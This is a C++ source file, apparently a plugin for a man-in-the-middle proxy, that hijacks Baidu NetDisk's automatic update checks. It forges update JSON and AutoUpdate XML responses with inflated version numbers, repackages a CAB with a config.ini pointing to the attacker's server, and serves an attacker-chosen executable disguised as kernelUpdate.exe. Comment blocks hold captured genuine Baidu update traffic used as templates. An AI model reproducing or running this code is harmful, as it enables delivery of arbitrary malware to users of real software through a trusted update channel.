#include "baiduNetDisk.h"

#include "PluginServer.h"
#include "../attacker.h"
#include "../HttpUtils.h"
#include "../cipher/CryptoUtils.h"
#include "../FileOper.h"
#include <iostream>
#include "../cipher/Base64.h"
#include "../cipher/compression.h"




int BaiduNetDisk::isBaiduUpdateJson(const char * url, const char * host) {
	if (strstr(host, "pan.baidu.com") && strstr(url, "/api/version/getlatestversion?") )
	{

		return TRUE;
	}
	
	return FALSE;
}



int BaiduNetDisk::isBaiduUpdateSSL(const char * url, const char * host) {
	if (strstr(host, "update.pan.baidu.com") && strstr(url, "/autoupdate"))
	{

		return TRUE;
	}

	return FALSE;
}

int BaiduNetDisk::replyBaiduUpdateSSL(char * dstbuf, int len, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	int iret = 0;
	string ip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;
	char * xmlformat =
		"<AutoUpdate version=\"1.0\">\r\n"
		"<Updater version=\"9.9.9.13\" url=\"http://%s/%s\" md5=\"%s\" hint=\"\">\r\n"
		"<File name=\"Autoupdate.exe\" dest=\"updater:\" type=\"bin\" operation=\"add\" md5=\"DA1AE788A708F28733891C736318508C\"/>\r\n"
		"<File name=\"AutoUpdateUtil.dll\" dest=\"updater:\" type=\"bin\" operation=\"add\" md5=\"8F9FE0642CD9E6A94A95281C2A901F4A\"/>\r\n"
		"<File name=\"config.ini\" dest=\"updater:\" type=\"resource\" operation=\"add\" md5=\"%s\"/>\r\n"
		"<File name=\"VersionInfo.xml\" dest=\"updater:\" type=\"resource\" operation=\"add\" md5=\"36546B67892CA7EDF136580CC51511C6\"/>\r\n"
		"</Updater>\r\n"
		"<Module>\r\n"
		"</Module>\r\n"
		"</AutoUpdate>";

	char * cmd = 0;

	string cabfn = "baiduyun_update.cab";
	string cabfilename = Public::getUserPluginPath(lpssl->username) + cabfn;

	string foldername = Public::getUserPluginPath(lpssl->username) + "baiduyun_update";

	string strcmd = "mkdir " + foldername;
	iret =system(strcmd.c_str());

	strcmd = "expand " + cabfilename + " destination " + foldername;
	iret =system(strcmd.c_str());

	char * iniformat =
		"[AutoUpdate]\r\n"
		"ConfigFileUrl = http://%s/%s\r\n"
		"IsAutoUpdate = 1\r\n"
		"AutoUpdateCheckDelay = 30";
	char inifile[1024];
	int inifz = wsprintfA(inifile, iniformat, ip.c_str(), WEIXIN_PC_UPDATE_EXE_FILENAME);

	string inifilename = foldername + "\\config.ini";
	FileOper::fileWriter(inifilename, inifile, inifz, TRUE);

	string txtfns = Public::getUserPluginPath(lpssl->username) + "baiduyun_update_files.txt";
	strcmd =
		string("baiduyun_update\\Autoupdate.exe\r\n") + "baiduyun_update\\AutoUpdateUtil.dll\r\n"+ "baiduyun_update\\config.ini\r\n"+ "baiduyun_update\\VersionInfo.xml\r\n";
	FileOper::fileWriter(txtfns, strcmd.c_str(), strcmd.length(),TRUE);

	string curpath = Public::getUserPluginPath(lpssl->username);
	SetCurrentDirectoryA(curpath.c_str());
	
	iret =system("makecab /f baiduyun_update_files.txt /d compressiontype=mszip /d compressionmemory=21 /d maxdisksize=1024000000 /d diskdirectorytemplate=./ /d cabinetnametemplate=baiduyun_update.cab");

	SetCurrentDirectoryA(gLocalPath.c_str());

	char cfgmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	inifz = CryptoUtils::getUpdateFileMd5(inifilename.c_str(), cfgmd5, hexmd5, 0);

	char packmd5[64] = { 0 };
	int packfs = CryptoUtils::getUpdateFileMd5(cabfilename.c_str(), packmd5, hexmd5, 0);

	int retlen = sprintf_s(dstbuf, dstbuflimit, xmlformat, ip.c_str(), cabfn.c_str(), packmd5, cfgmd5);
	return retlen;
}

int BaiduNetDisk::replyBaiduJson(char * dstbuf, int len, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {

	string ip = HttpUtils::getIPstr(gServerIP) + "\\/" + lphttp->username;

		char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=UTF-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

		string ipnormal = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;

		string szjsonfn = "baiduyunUpdate.json";

		string gzfilename = "kernelUpdate.gz";

		string exefilename = "kernelUpdate.exe";

		string szjsfp = Public::getUserPluginPath(lphttp->username) + szjsonfn;

		string exefp = Public::getUserPluginPath(lphttp->username) + WEIXIN_PC_UPDATE_EXE_FILENAME;

		string gzfp = Public::getUserPluginPath(lphttp->username) + gzfilename;

		int ret = Compress::gzfile(exefp, gzfp, TRUE, exefilename);

		char gzmd5[64] = { 0 };
		unsigned char gzhexmd5[64] = { 0 };
		int gzfilesize = CryptoUtils::getUpdateFileMd5(gzfp.c_str(), gzmd5, gzhexmd5, 1);

		string jsondatafmt =
			"{\r\n"
			"\"version\":\"9.9.70.40\",\r\n"
			"\"kueinfo\":\r\n"
			"{\r\n"
			"\"name\":\"kernelUpdate.exe\", \r\n"
			"\"version\":\"9.9.70.40\", \r\n"
			"\"url\":\"http://%s/%s\", \r\n"
			"\"md5\":\"%s\"\r\n"
			"}\r\n"
			"}";

		char szjsdata[0x1000];
		int szjslen = wsprintfA(szjsdata, jsondatafmt.c_str(), ipnormal.c_str(), gzfilename.c_str(), gzmd5);

		ret = FileOper::fileWriter(szjsfp.c_str(), szjsdata, szjslen, 1);

		char jsmd5[64] = { 0 };
		unsigned char hexmd5[64] = { 0 };
		int jsfilesize = CryptoUtils::getUpdateFileMd5(szjsfp, jsmd5, hexmd5, 1);
		if (jsfilesize <= 0)
		{
			return FALSE;
		}

		string version = "9.9.23.863";		//1.0.23.863

		char * retformat =
			"{\"force_update\":0,\"version\":\"%s\",\"url\":\"http:\\/\\/%s\\/%s\","
			"\"title\":\"kernelUpdate.exe\",\"detail\":\"update baidu netdisk\","
			"\"version_code\":\"99999\",\"md5\":\"%s\",\"errno\":0}";	

		char result[4096];
		int retlen = sprintf(result, retformat, version.c_str(), ip.c_str(), szjsonfn.c_str(), jsmd5);

		int responseLen = sprintf_s(dstbuf, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, retlen, result);

		return responseLen;
}




/*
GET /api/version/getlatestversion?clienttype=30&version=2.0.2.23&peerid=35434416659E23F1E9DFD6ACAC07C150&channel=p2p-pc_2.0_pc_netdisk_default HTTP/1.1
Host: pan.baidu.com

HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: keep-alive
Content-Type: application/json; charset=UTF-8
Date: Tue, 07 Apr 2020 16:25:06 GMT
Flow-Level: 3
Logid: 9190830031386779235
P3p: CP=" OTI DSP COR IVA OUR IND COM "
Server: nginx
Set-Cookie: BAIDUID=72A2F8F526219AA1EE99DD06C15E8C4C:FG=1; expires=Wed, 07-Apr-21 16:25:06 GMT; max-age=31536000; path=/; domain=.baidu.com; version=1
Vary: Accept-Encoding
X-Powered-By: BaiduCloud
Yld: 9190830031386779235
Yme: ZIGW+icyQE0WYisBRnb+qnFIufgAQgfrqwRFwSCGmFSrieZ9
Content-Length: 291

{"force_update":0,"version":"2.0.2.23","url":"http:\/\/issuecdn.baidupcs.com\/issue\/netdisk\/p2p-pc\/kui.json\/kui20223.json",
"title":"kernel.dll 2.2.60.75","detail":"1 \u57fa\u4e8e2.2.60.63\u4fee\u6539\u7248\u672c\u53f7\u91cd\u65b0\u63d0\u6d4b\u3002",
"version_code":"0","md5":"","errno":0}




GET /issue/netdisk/p2p-pc/kui.json/kui20223.json HTTP/1.1
Content-Type: text/json
Host: issuecdn.baidupcs.com

HTTP/1.1 200 OK
Server: JSP3/2.0.14
Date: Tue, 07 Apr 2020 16:25:06 GMT
Content-Type: text/json
Content-Length: 779
Connection: keep-alive
ETag: 7bfef04ef9cc4878b576b4c89890a26d
Last-Modified: Wed, 25 Mar 2020 04:03:24 GMT
Expires: Thu, 09 Apr 2020 04:20:47 GMT
Age: 129859
Accept-Ranges: bytes
Cache-Control: max-age=259200
Content-Disposition: attachment;filename="kui20223.json"
x-bs-client-ip: MjIzLjExMS4xMjcuNTk=
x-bs-file-size: 779
x-bs-request-id: MTAuMTM0LjExNy40MTo4NjQzOjE5NjAxMjQ3NDg2OTA0NTE5MDE6MjAyMC0wMy0yNSAxMjoyMDozMw==
x-bs-meta-crc32: 3193197358
Content-MD5: 7bfef04ef9cc4878b576b4c89890a26d
superfile: 0
Ohc-Response-Time: 1 0 0 0 0 0
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS, HEAD
Ohc-Cache-HIT: hn2cm59 [4], yangzcmcache59 [2]

{"version":"2.0.2.23",
"KUInfo":{"name":"kernel.dll","version":"2.2.60.75","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernel/kernel.226075.gz","md5":"ba1b161be276e8c718c8e303e3139b00"},
"k1info":{"name":"kernelbasis.dll","version":"2.1.5.18","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelbasis/kernelbasis.21518.gz","md5":"75412f1adb02efe4b6513cff9c69242a"},
"k2info":{"name":"kernelpromote.dll","version":"2.2.60.6","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelpromote/kernelpromote.22606.gz ","md5":"78b5eda12587eb1c5bde8029b75b9e63"},
"kueinfo":{"name":"kernelUpdate.exe","version":"2.0.0.9","url":"http://issuecdn.baidupcs.com/issue/netdisk/p2p-pc/kernelUpdate/kernelUpdate.2009.gz","md5":"64a23eee7e81b0f45056221e9fde7c4a"}}

*/



/*
GET /autoupdate HTTP/1.1
Accept: *//*
Pragma: ver=7.2.8.9;channel=00000000000000000000000000000000;clienttype=8;baiduid=18265858190;baiduid_encode=3138323635383538313930;osver=10.0.18363;inner_ip=192.168.40.1;updaterver=1.0.0.13;udxml_md5=BBFD164EF74985410859C6B7EE90014B;update_type=auto;xp_sp3=1;win7_later=1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Host: update.pan.baidu.com

HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Description: File Transfer
Content-Disposition: attachment; filename=AutoUpdate.xml
Content-Length: 16435
Content-Type: application/octet-stream
Date: Thu, 03 Jun 2021 13:27:07 GMT
Pragma: no-cache
Server: lighttpd
X-Powered-By: PHP/5.4.24

<AutoUpdate version="1.0">
	<Updater version="1.0.0.13" url="http://issuecdn.baidupcs.com/issue/netdisk/pc-guanjia-update/7.3.2.11/updater_73211.cab" md5="BA6330869F9DB81B2CC805A991FB8FF3" hint="">
		<File name="Autoupdate.exe" dest="updater:\" type="bin" operation="add" md5="DA1AE788A708F28733891C736318508C"/>
		<File name="AutoUpdateUtil.dll" dest="updater:\" type="bin" operation="add" md5="8F9FE0642CD9E6A94A95281C2A901F4A"/>
		<File name="config.ini" dest="updater:\" type="resource" operation="add" md5="ABE0392D19BAE73AE96E262E6CDBB8E2"/>
		<File name="VersionInfo.xml" dest="updater:\" type="resource" operation="add" md5="36546B67892CA7EDF136580CC51511C6"/>
	</Updater>
	<Module name="MainApp" text="7.3.2.11自动升级" version="7.3.2.11" level="force">
		<FullPackage hint="1.提升工作空间同步性能，修复部分已知\\n   问题" md5="7BBBD94764EA1DDDE1209A6FDBEA6671" url="http://issuecdn.baidupcs.com/issue/netdisk/pc-guanjia-update/7.3.2.11/fullpackage_73211.cab">
			<File name="appproperty.xml" dest="MainApp:\" type="resource" operation="add" md5="38A35EE4EF24896D4450825D30DA2D84"/>
			<File name="apputil.dll" dest="MainApp:\" type="bin" operation="add" md5="7AFCDFC4B5D1AC1BF70AAF30F3FE9A94"/>
			<File name="autobackup.ico" dest="MainApp:\" type="resource" operation="add" md5="B415AF318CCF6889CD8F754B81AE5882"/>
			<File name="autodiagnose.dll" dest="MainApp:\" type="bin" operation="add" md5="365493FEE5121AF13078DA79957B185E"/>
			<File name="autodiagnoseupdate.exe" dest="MainApp:\" type="bin" operation="add" md5="22E06013D7982637F91532E547F50066"/>
			<File name="baidunetdisk.exe" dest="MainApp:\" type="bin" operation="add" md5="F18709ADBD3E3076B79F7C24AD03749B"/>
			<File name="baidunetdiskhost.exe" dest="MainApp:\" type="bin" operation="add" md5="E18E70FC08E3B7CE560F99BD7950067A"/>
			<File name="baidunetdiskrender.exe" dest="MainApp:\" type="bin" operation="add" md5="1AA4AAD5F49B28B71C7FB1D39F43CBCE"/>
			<File name="basement.dll" dest="MainApp:\" type="bin" operation="add" md5="B5EBAAB56C0B9CD1A401559DDB77364B"/>
			<File name="browserres\cef.pak" dest="MainApp:\browserres\" type="resource" operation="add" md5="4D991B6DB94E823AAC8CEF6EB1959662"/>
			<File name="browserres\cef_100_percent.pak" dest="MainApp:\browserres\" type="resource" operation="add" md5="AD2DDFC39C78EEDC734AF6506A579A8C"/>
			<File name="browserres\cef_200_percent.pak" dest="MainApp:\browserres\" type="resource" operation="add" md5="66FA52C0523AE2EC18C37960E4EB3E6A"/>
			<File name="browserres\cef_extensions.pak" dest="MainApp:\browserres\" type="resource" operation="add" md5="6E727928EBEEEB5847C65C15C41802ED"/>
			<File name="browserres\devtools_resources.pak" dest="MainApp:\browserres\" type="resource" operation="add" md5="901E09CA208C8AA98E80E9376D6858BD"/>
			<File name="browserres\locales\en-us.pak" dest="MainApp:\browserres\locales\" type="resource" operation="add" md5="EA20F7EF299CA680A72E9163C8ED0093"/>
			<File name="browserres\locales\zh-cn.pak" dest="MainApp:\browserres\locales\" type="resource" operation="add" md5="C3FD82EC2CDDCF7192E9DE8D9834DBC5"/>
			<File name="bugreport.exe" dest="MainApp:\" type="bin" operation="add" md5="FB5203E6A35BF105629CA9451C8984CD"/>
			<File name="bull140u.dll" dest="MainApp:\" type="bin" operation="add" md5="DFD9B712F3B60AF5F7BA66B280761DB9"/>
			<File name="cacert.pem" dest="MainApp:\" type="resource" operation="add" md5="16E9FA85CCA8B644874E5B0EAA4C270B"/>
			<File name="cef license.txt" dest="MainApp:\" type="resource" operation="add" md5="2F8140B8196193515B2ABBE17B675E39"/>
			<File name="cefbrowser.dll" dest="MainApp:\" type="bin" operation="add" md5="E67399CBDC4EA7A535E53E715136CB8A"/>
			<File name="channelpcsdk.dll" dest="MainApp:\" type="bin" operation="add" md5="5B8955B8110EB4E5F69112FDB19737B3"/>
			<File name="concrt140.dll" dest="MainApp:\" type="bin" operation="add" md5="ABDEF5F24D965BEB17ACC7948B4BEBFD"/>
			<File name="crossdomain.dat" dest="MainApp:\" type="resource" operation="add" md5="559E5730E503DD8523F032317DAF4F5D"/>
			<File name="d3dcompiler_43.dll" dest="MainApp:\" type="bin" operation="add" md5="B0999564A5791E5F602EE163A3B4B4D3"/>
			<File name="d3dcompiler_47.dll" dest="MainApp:\" type="bin" operation="add" md5="00B9E01024D9E8935BA397FDFCE60B3A"/>
			<File name="duiengine license.txt" dest="MainApp:\" type="resource" operation="add" md5="EC1F61829F3E9852C9019A48D8158F1D"/>
			<File name="exiv2.dll" dest="MainApp:\" type="bin" operation="add" md5="DE79BE0B32D7F76892F438DCBAD03FEB"/>
			<File name="helputility.exe" dest="MainApp:\" type="bin" operation="add" md5="3209C550ACA2720D851328374008B8A8"/>
			<File name="icudtl.dat" dest="MainApp:\" type="resource" operation="add" md5="D03AD9A1189D190119209072D048E428"/>
			<File name="kernel.dll" dest="MainApp:\" type="bin" operation="add" md5="E61C7983AA3F86C3DBAB49E63545EE5F"/>
			<File name="kernelupdate.exe" dest="MainApp:\" type="bin" operation="add" md5="D4671CF9FD9C0FEB72636D6B7134B9B4"/>
			<File name="libcef.dll" dest="MainApp:\" type="bin" operation="add" md5="58B371598E357EB5FC9AE2DE0DF2AF0D"/>
			<File name="libegl.dll" dest="MainApp:\" type="bin" operation="add" md5="A44A28B5DE4ECE2D1937F1135E21D076"/>
			<File name="libexpat.dll" dest="MainApp:\" type="bin" operation="add" md5="346B4584A82094241B55AA06BD9484D9"/>
			<File name="libglesv2.dll" dest="MainApp:\" type="bin" operation="add" md5="2C6F10DE86828C935C663EBF47E44189"/>
			<File name="libtorrent_license.txt" dest="MainApp:\" type="resource" operation="add" md5="E237B8E69824B35C276817E90EBDDB7F"/>
			<File name="logonbd.dll" dest="MainApp:\" type="bin" operation="add" md5="2FD0DC7D664537142799508B8A27B61D"/>
			<File name="logonbdext.dll" dest="MainApp:\" type="bin" operation="add" md5="EAFA301CE61F1012006396B4EF3F8CE2"/>
			<File name="minosagent.dll" dest="MainApp:\" type="bin" operation="add" md5="BECE035264EAF3C68A2D4996E86DB8B7"/>
			<File name="module\baidunetdiskmodulelist.db" dest="MainApp:\module\" type="resource" operation="add" md5="7A2B9D77DC5BE17163EDD5F4F29DEE38"/>
			<File name="module\kernelcom\kernelcom.dll" dest="MainApp:\module\kernelcom\" type="bin" operation="add" md5="5D070B512D14BF1E3287B5DD06F6EC52"/>
			<File name="module\vastplayer\vastplayer.dll" dest="MainApp:\module\vastplayer\" type="bin" operation="add" md5="F4704000BD05D4E837220D885A599ADF"/>
			<File name="msvcp140.dll" dest="MainApp:\" type="bin" operation="add" md5="1D8C79F293CA86E8857149FB4EFE4452"/>
			<File name="natives_blob.bin" dest="MainApp:\" type="resource" operation="add" md5="8F4D6515F4D321313A39A659C3C5FF01"/>
			<File name="netdisk_logo.ico" dest="MainApp:\" type="resource" operation="add" md5="68F413266D7FCFA66ADB7BA2CDDF5E54"/>
			<File name="npyunwebdetect.dll" dest="MainApp:\" type="bin" operation="add" md5="C886E606C99BE20BDC9DCE8CEBE6E829"/>
			<File name="resource.db" dest="MainApp:\" type="resource" operation="add" md5="1B9129F6C3028E77C9DBCCCEFDEF9718"/>
			<File name="serviceassistans.exe" dest="MainApp:\" type="bin" operation="add" md5="287865FC4AD672FA9763FE37C47C2CE5"/>
			<File name="skin\default.db" dest="MainApp:\skin\" type="resource" operation="add" md5="ADACA477DEFAB58A9940FCDFA3DE3343"/>
			<File name="skin\duiengineskin.zip" dest="MainApp:\skin\" type="resource" operation="add" md5="6AF147C72960F4DE59C0B32D576ABE1C"/>
			<File name="snapshot_blob.bin" dest="MainApp:\" type="resource" operation="add" md5="B087F73C2F65FF8CC47CBBC359215BEE"/>
			<File name="sounds\1.wav" dest="MainApp:\sounds\" type="resource" operation="add" md5="583F4E6B4BB00DD4B9DFAF7338F6F414"/>
			<File name="sounds\2.wav" dest="MainApp:\sounds\" type="resource" operation="add" md5="4408F456A35C301EE1B951E20FFA71BB"/>
			<File name="sounds\3.wav" dest="MainApp:\sounds\" type="resource" operation="add" md5="9CA4AEC9EF66806361F3E0AE86792C86"/>
			<File name="sounds\4.wav" dest="MainApp:\sounds\" type="resource" operation="add" md5="0616BA6AA33FCC59C46F7EDAEA9B3E9E"/>
			<File name="ucrtbase.dll" dest="MainApp:\" type="bin" operation="add" md5="8ED02A1A11CEC72B6A6A4989BF03CFCC"/>
			<File name="uninst.exe" dest="MainApp:\" type="bin" operation="add" md5="371E9A97834B5C82D2D3C30FA6CAA508"/>
			<File name="updateagent.dll" dest="MainApp:\" type="bin" operation="add" md5="F6EB6F4567EB827B52D9D990CF5A6CCF"/>
			<File name="vcruntime140.dll" dest="MainApp:\" type="bin" operation="add" md5="B77EEAEAF5F8493189B89852F3A7A712"/>
			<File name="versioninfo" dest="MainApp:\" type="resource" operation="add" md5="1FB502692CE9CF5C8EDE260C62E1F4AB"/>
			<File name="versioninfo2" dest="MainApp:\" type="resource" operation="add" md5="45545F4E3E96ED590ECF18364DE7AD1D"/>
			<File name="widevinecdmadapter.dll" dest="MainApp:\" type="bin" operation="add" md5="758947464E2201E289FFF5F7B4E9557F"/>
			<File name="workspace_desktop_logo.ico" dest="MainApp:\" type="resource" operation="add" md5="FFE0900B18FEE32FC3ABFB145782AA01"/>
			<File name="workspace_logo.ico" dest="MainApp:\" type="resource" operation="add" md5="D08F42283A8A95A97D9AE57A5D789D17"/>
			<File name="ximage.dll" dest="MainApp:\" type="bin" operation="add" md5="1E49F15D11B481007E6DCC1FD72E3BC9"/>
			<File name="yundb.dll" dest="MainApp:\" type="bin" operation="add" md5="BF6C799EFDF1D5345008BEB146CE653E"/>
			<File name="yundetectservice.exe" dest="MainApp:\" type="bin" operation="add" md5="CE451892741A2A44759A16829EA3FBD1"/>
			<File name="yundls.dll" dest="MainApp:\" type="bin" operation="add" md5="4B698E865961DC62C24C3F367EBC5A84"/>
			<File name="yunlogic.dll" dest="MainApp:\" type="bin" operation="add" md5="10069F1928FA5A5C1B66B1C99A078499"/>
			<File name="yunofficeaddin.dll" dest="MainApp:\" type="bin" operation="add" md5="13C972B56FFD886606D0F1CA2A528EAB"/>
			<File name="yunofficeaddin64.dll" dest="MainApp:\" type="bin" operation="add" md5="75784EC80B9B74BDB00DBA6E6FA9FEC5"/>
			<File name="yunshellext.dll" dest="MainApp:\" type="bin" operation="add" md5="021DA5AD21326D1E9FA444AE7D0F2DE6"/>
			<File name="yunshellext64.dll" dest="MainApp:\" type="bin" operation="add" md5="159D5D54D4259063889D7BA06544F35E"/>
			<File name="yunsub.dll" dest="MainApp:\" type="bin" operation="add" md5="3F2A5BD371AE47F7F4F340255A0506EA"/>
			<File name="yuntorrentfile.ico" dest="MainApp:\" type="resource" operation="add" md5="B8E288AB1A7309DB50492F729A742072"/>
			<File name="yunutilityservice.exe" dest="MainApp:\" type="bin" operation="add" md5="1435B19570D7134F32BC8A977EE7F4D0"/>
			<File name="yundetectservice.exe" dest="MainApp:\" type="restart" operation="exe"/>
			<File name="baidunetdisk.exe" dest="MainApp:\" type="-install rename" operation="exe" />
			<File name="baiduyunguanjia.exe" dest="MainApp:\" type="bin" operation="del"/>
			<File name="guanjia_logo.ico" dest="MainApp:\" type="resource" operation="del"/>
		</FullPackage>
	</Module>
</AutoUpdate>
*/